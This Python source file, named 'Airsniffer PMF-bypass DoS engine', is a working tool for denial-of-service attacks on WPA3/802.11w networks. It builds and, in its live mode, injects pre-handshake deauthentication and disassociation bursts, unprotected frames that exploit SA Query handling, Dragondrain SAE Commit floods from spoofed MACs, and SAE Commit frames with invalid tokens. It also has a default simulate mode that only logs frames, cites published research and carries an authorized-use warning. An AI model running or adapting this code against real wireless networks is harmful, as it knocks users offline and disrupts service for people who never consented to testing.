#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Airsniffer - PMF-bypass DoS engine
==================================

Classic deauthentication stops working once Protected Management Frames (PMF /
802.11w) are in force - and WPA3 makes PMF mandatory. This engine implements the
DoS techniques that keep working against WPA3/PMF networks, as documented in the
research:

  * prehandshake  - deauth/disassoc delivered in the association window, BEFORE
                    the 4-way handshake installs the PTK. PMF only protects
                    frames after key install, so a client that is (re)connecting
                    can still be knocked back. (Ghanim & Thanoun 2025; Chadee et
                    al. 2024.)
  * saquery       - send an unprotected deauth/disassoc/assoc/reassoc to a STA
                    that holds an active SA. The spec's handling is inconsistent
                    (drop vs. start an SA Query), and some stacks can be made to
                    disconnect or be flooded. (Schepers, Ranganathan, Vanhoef,
                    WiSec 2022 - "On the robustness of Wi-Fi deauth
                    countermeasures".)
  * dragondrain   - flood WPA3-SAE Commit frames (auth algo = SAE, seq = 1) with
                    spoofed source MACs to exhaust the AP's CPU computing the
                    quadratic-residue / curve ops. No deauth required.
                    (Vanhoef & Ronen 2019.)
  * badtoken      - send SAE Commit frames bearing an invalid anti-clogging
                    token to drive the AP's error / token-recompute path.
                    (Lounis & Zulkernine 2019.)

Two execution modes, exactly like the Fuzzing DoS engine:

  * simulate (default, safe) - crafts and *logs* every frame that WOULD be sent,
    transmits nothing, needs no hardware/root/scapy. Good for demos and CI.
  * live - real scapy injection on a monitor-mode interface (Linux + root).

AUTHORIZED USE ONLY. Live mode disrupts service - run it only against networks
you own or are explicitly authorized to test.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import time
from typing import Optional

# 802.11 reason codes commonly used for deauth/disassoc.
REASON_CODES = {
    "unspecified": 1,
    "prev_auth_invalid": 2,
    "deauth_leaving": 3,
    "inactivity": 4,
    "class3_frame": 7,     # "Class 3 frame received from nonassociated STA"
    "sa_query_timeout": 28,
}

# Which strategies keep working with PMF mandatory (for operator guidance).
PMF_RESISTANT = {"prehandshake", "saquery", "dragondrain", "badtoken"}

STRATEGIES = ("prehandshake", "saquery", "dragondrain", "badtoken")


def rand_mac() -> str:
    """A locally-administered, unicast random MAC (for spoofed SAE floods)."""
    first = (random.getrandbits(8) & 0xFC) | 0x02  # LAA bit set, unicast
    return "%02X:%s" % (first, ":".join("%02X" % random.getrandbits(8)
                                        for _ in range(5)))


class Transmitter:
    def __init__(self, cfg: dict):
        self.cfg = cfg
        self.sent = 0
        self.scapy = None
        if cfg["mode"] == "live":
            self._load_scapy()

    def _load_scapy(self):
        try:
            from scapy.all import RadioTap, Dot11  # noqa: F401
            self.scapy = sys.modules["scapy.all"]
        except Exception as exc:  # pragma: no cover - host dependent
            sys.exit("[!] live mode needs scapy (pip install scapy) and Linux "
                     "monitor mode. Import failed: %s" % exc)

    def send_mgmt(self, subtype: str, dst: str, src: str, bssid: str,
                  reason: Optional[int] = None, extra: Optional[dict] = None):
        """Send (or log) one management frame."""
        self.sent += 1
        rec = {"subtype": subtype, "dst": dst, "src": src, "bssid": bssid}
        if reason is not None:
            rec["reason"] = reason
        if extra:
            rec.update(extra)
        if self.scapy is None:
            return rec

        S = self.scapy
        d = S.Dot11(addr1=dst, addr2=src, addr3=bssid)
        if subtype == "deauth":
            frame = S.RadioTap() / d / S.Dot11Deauth(reason=reason or 7)
        elif subtype == "disassoc":
            frame = S.RadioTap() / d / S.Dot11Disas(reason=reason or 7)
        elif subtype == "assoc_req":
            frame = (S.RadioTap() / d / S.Dot11AssoReq()
                     / S.Dot11Elt(ID=0, info=self.cfg["ssid"]))
        elif subtype == "reassoc_req":
            frame = (S.RadioTap() / d / S.Dot11ReassoReq()
                     / S.Dot11Elt(ID=0, info=self.cfg["ssid"]))
        elif subtype == "sae_commit":
            # SAE Commit: auth algorithm = 3 (SAE), transaction seq = 1.
            frame = (S.RadioTap() / d
                     / S.Dot11Auth(algo=3, seqnum=1, status=0))
        else:
            frame = S.RadioTap() / d
        S.sendp(frame, iface=self.cfg["iface"], count=1, verbose=0)
        return None


def log_event(cfg: dict, event: dict) -> None:
    with open(os.path.join(cfg["logdir"], "pmf_dos.jsonl"), "a",
              encoding="utf-8") as fh:
        fh.write(json.dumps(event) + "\n")


# --------------------------------------------------------------------------- #
# Strategies
# --------------------------------------------------------------------------- #

def run_prehandshake(cfg: dict, tx: Transmitter) -> int:
    """Deauth/disassoc the victim in the (re)association window, before the PTK
    is installed. Alternate deauth and disassoc, AP->client and client->AP."""
    ap, sta = cfg["ap_mac"], cfg["sta_mac"]
    reason = REASON_CODES["class3_frame"]
    bursts = cfg["count"]
    for _ in range(bursts):
        tx.send_mgmt("deauth", dst=sta, src=ap, bssid=ap, reason=reason)
        tx.send_mgmt("deauth", dst=ap, src=sta, bssid=ap, reason=reason)
        tx.send_mgmt("disassoc", dst=sta, src=ap, bssid=ap,
                     reason=REASON_CODES["prev_auth_invalid"])
    print("[+] prehandshake: %d bursts (deauth+disassoc, pre-PTK window)"
          % bursts)
    return tx.sent


def run_saquery(cfg: dict, tx: Transmitter) -> int:
    """Send unprotected mgmt frames to a STA with an active SA to exercise the
    inconsistent SA-Query handling (Schepers et al.)."""
    ap, sta = cfg["ap_mac"], cfg["sta_mac"]
    for _ in range(cfg["count"]):
        for sub, reason in (("deauth", REASON_CODES["class3_frame"]),
                            ("disassoc", REASON_CODES["unspecified"]),
                            ("assoc_req", None),
                            ("reassoc_req", None)):
            rec = tx.send_mgmt(sub, dst=(ap if sub.endswith("req") else sta),
                               src=sta, bssid=ap, reason=reason,
                               extra={"note": "unprotected -> SA Query path"})
            if rec:
                pass
    print("[+] saquery: %d rounds of unprotected deauth/disassoc/(re)assoc"
          % cfg["count"])
    return tx.sent


def run_dragondrain(cfg: dict, tx: Transmitter) -> int:
    """Flood SAE Commit frames from spoofed MACs to exhaust AP CPU. The paper's
    threshold is ~16 forged commits/sec to overload a typical AP."""
    ap = cfg["ap_mac"]
    for _ in range(cfg["count"]):
        src = rand_mac()
        tx.send_mgmt("sae_commit", dst=ap, src=src, bssid=ap,
                     extra={"attack": "dragondrain", "spoofed_src": True})
    print("[+] dragondrain: %d SAE Commit frames from spoofed MACs "
          "(target >=16/s to overload)" % cfg["count"])
    return tx.sent


def run_badtoken(cfg: dict, tx: Transmitter) -> int:
    """SAE Commit frames carrying an invalid anti-clogging token."""
    ap, sta = cfg["ap_mac"], cfg["sta_mac"]
    for _ in range(cfg["count"]):
        bogus = "%016x" % random.getrandbits(64)
        tx.send_mgmt("sae_commit", dst=ap, src=sta, bssid=ap,
                     extra={"attack": "badtoken", "bad_token": bogus})
    print("[+] badtoken: %d SAE Commit frames with invalid anti-clogging tokens"
          % cfg["count"])
    return tx.sent


DISPATCH = {
    "prehandshake": run_prehandshake,
    "saquery": run_saquery,
    "dragondrain": run_dragondrain,
    "badtoken": run_badtoken,
}


def run(cfg: dict) -> int:
    tx = Transmitter(cfg)
    reps = cfg["repeat"]
    total = 0
    for r in range(reps):
        if reps > 1:
            print("[>] pass %d/%d" % (r + 1, reps))
        total = DISPATCH[cfg["strategy"]](cfg, tx)
        if cfg["mode"] == "simulate":
            # Log a compact summary event per pass (frames are not all stored).
            log_event(cfg, {"ts": time.time(), "strategy": cfg["strategy"],
                            "ap": cfg["ap_mac"], "sta": cfg["sta_mac"],
                            "ssid": cfg["ssid"], "frames": tx.sent,
                            "pmf_resistant": cfg["strategy"] in PMF_RESISTANT})
        if reps > 1 and r < reps - 1 and cfg["mode"] == "live":
            time.sleep(cfg["interval"])
    return tx.sent


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Airsniffer PMF-bypass DoS engine (WPA3/PMF-resistant).")
    p.add_argument("--strategy", required=True, choices=STRATEGIES)
    p.add_argument("--mode", default="simulate", choices=["simulate", "live"])
    p.add_argument("--iface", default="wlan0mon")
    p.add_argument("--ap-mac", default="AA:AA:AA:AA:AA:AA")
    p.add_argument("--sta-mac", default="BB:BB:BB:BB:BB:BB")
    p.add_argument("--ssid", default="TARGET_SSID")
    p.add_argument("--channel", default="1")
    p.add_argument("--count", type=int, default=64,
                   help="frames/bursts per pass")
    p.add_argument("--repeat", type=int, default=1, help="number of passes")
    p.add_argument("--interval", type=float, default=1.0,
                   help="seconds between live passes")
    p.add_argument("--logdir", default=".")
    p.add_argument("--seed", type=int, default=None)
    return p.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = parse_args(sys.argv[1:] if argv is None else argv)
    if args.seed is not None:
        random.seed(args.seed)
    os.makedirs(args.logdir, exist_ok=True)

    cfg = {
        "strategy": args.strategy, "mode": args.mode, "iface": args.iface,
        "ap_mac": args.ap_mac, "sta_mac": args.sta_mac, "ssid": args.ssid,
        "channel": args.channel, "count": args.count, "repeat": args.repeat,
        "interval": args.interval, "logdir": args.logdir,
    }

    banner = ("SIMULATION (no frames transmitted)"
              if args.mode == "simulate" else "LIVE INJECTION")
    pmf = "PMF-resistant" if args.strategy in PMF_RESISTANT else "PMF-off only"
    print("=" * 62)
    print(" Airsniffer PMF-bypass DoS - %s" % banner)
    print(" strategy %s (%s) | AP %s | STA %s | ch %s"
          % (args.strategy, pmf, cfg["ap_mac"], cfg["sta_mac"], cfg["channel"]))
    print("=" * 62)

    sent = run(cfg)

    print("-" * 62)
    print("[=] done. frames %s: %d"
          % ("logged" if args.mode == "simulate" else "sent", sent))
    if args.mode == "simulate":
        print("[i] simulation only - nothing was actually transmitted.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
